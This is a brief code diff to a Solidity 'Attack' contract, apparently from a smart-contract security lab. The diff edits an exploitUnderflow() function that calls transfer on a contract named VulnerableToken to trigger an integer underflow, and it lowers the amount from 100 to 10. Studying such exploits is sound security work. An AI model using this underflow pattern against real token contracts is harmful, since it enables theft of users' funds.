@@ -10,7 +10,8 @@ contract Attack {
         vulnerableToken = VulnerableToken(_vulnerableTokenAddress);
     }
 
+    // Perform underflow attack
     function exploitUnderflow() public {
-        vulnerableToken.transfer(msg.sender, 100); // ⚡ Try sending way more than 2 tokens
+        vulnerableToken.transfer(msg.sender, 10); // ⚡ Try sending 10 token
     }
 }
